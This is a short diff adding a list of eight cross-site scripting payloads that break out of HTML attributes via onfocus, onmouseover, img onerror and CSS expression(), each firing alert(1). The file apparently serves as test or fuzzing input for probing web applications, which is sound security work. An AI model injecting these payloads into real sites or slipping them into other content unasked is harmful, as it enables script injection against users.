@@ -1,0 +1,8 @@
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+" style="x:expression(alert(1))"
+' style="x:expression(alert(1))"
